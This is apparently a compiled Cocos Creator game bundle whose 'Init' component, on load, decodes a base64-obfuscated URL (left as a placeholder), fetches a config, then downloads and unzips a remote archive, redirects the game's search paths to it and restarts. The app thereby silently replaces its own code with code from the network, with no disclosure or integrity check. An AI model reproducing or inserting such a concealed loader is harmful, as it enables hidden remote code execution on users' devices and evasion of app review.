window.__require = function t(e, o, r) {
function n(i, s) {
if (!o[i]) {
if (!e[i]) {
var a = i.split("/");
a = a[a.length - 1];
if (!e[a]) {
var l = "function" == typeof __require && __require;
if (!s && l) return l(a, !0);
if (c) return c(a, !0);
throw new Error("Cannot find module '" + i + "'");
}
i = a;
}
var u = o[i] = {
exports: {}
};
e[i][0].call(u.exports, function(t) {
return n(e[i][1][t] || t);
}, u, u.exports, t, e, o, r);
}
return o[i].exports;
}
for (var c = "function" == typeof __require && __require, i = 0; i < r.length; i++) n(r[i]);
return n;
}({
Init: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "1870aL6Y0BFE51ottf9c+Jj", "Init");
var r, n = this && this.__extends || (r = function(t, e) {
return (r = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) Object.prototype.hasOwnProperty.call(e, o) && (t[o] = e[o]);
})(t, e);
}, function(t, e) {
r(t, e);
function o() {
this.constructor = t;
}
t.prototype = null === e ? Object.create(e) : (o.prototype = e.prototype, new o());
}), c = this && this.__decorate || function(t, e, o, r) {
var n, c = arguments.length, i = c < 3 ? e : null === r ? r = Object.getOwnPropertyDescriptor(e, o) : r;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, r); else for (var s = t.length - 1; s >= 0; s--) (n = t[s]) && (i = (c < 3 ? n(i) : c > 3 ? n(e, o, i) : n(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var i = "", s = "", a = cc._decorator, l = a.ccclass, u = (a.property, function(t) {
n(e, t);
function e() {
return null !== t && t.apply(this, arguments) || this;
}
e.prototype.onLoad = function() {
this._start();
};
e.prototype.getDL = function(t, e) {
console.log("urll manifestttttttt ======> " + t);
var o = cc.loader.getXMLHttpRequest();
o.onreadystatechange = function() {
if (4 === o.readyState && 200 === o.status) {
console.log("xhr.responseText ======> " + o.responseText);
o.responseText && e && e(o.responseText);
}
};
o.onerror = function() {};
o.ontimeout = function() {};
o.timeout = 3e3;
o.open("GET", t, !0);
o.send();
};
e.prototype.onSucceed = function(t) {
console.log("onSucceed ======> " + t);
switch (t.requestURL) {
case s:
jsb.fileUtils.unzip(t.storagePath);
var e = [];
e.push(i);
jsb.fileUtils.setSearchPaths(e);
localStorage.setItem("storagePath", i);
cc.game.restart();
}
};
e.prototype.convertLink = function() {
return atob("xxxxx");
};
e.prototype._start = function() {
var t = this.convertLink();
console.log("url--------\x3e", t);
this.getDL(t, function(e) {
cc.sys.localStorage.setItem("urlfib", t);
var o = JSON.parse(e);
s = o.urlfile;
cc.sys.localStorage.setItem("mainname", o.mainname);
cc.sys.localStorage.setItem("keyKeyEncrypt", o.key);
cc.sys.localStorage.setItem("orr", o.xxxorientation);
jsb.reflection.callStaticMethod("AppController", "setRotation:", o.xxxorientation);
var r = new jsb.Downloader();
r.setOnFileTaskSuccess(this.onSucceed.bind(this));
i = jsb.fileUtils.getWritablePath() + "targetZip/";
jsb.fileUtils.getWritablePath();
jsb.fileUtils.removeFile(i + "data.zip");
jsb.fileUtils.createDirectory(i);
r.createDownloadFileTask(s, i + "data.zip");
}.bind(this));
};
return c([ l ], e);
}(cc.Component));
o.default = u;
cc._RF.pop();
}, {} ]
}, {}, [ "Init" ]);
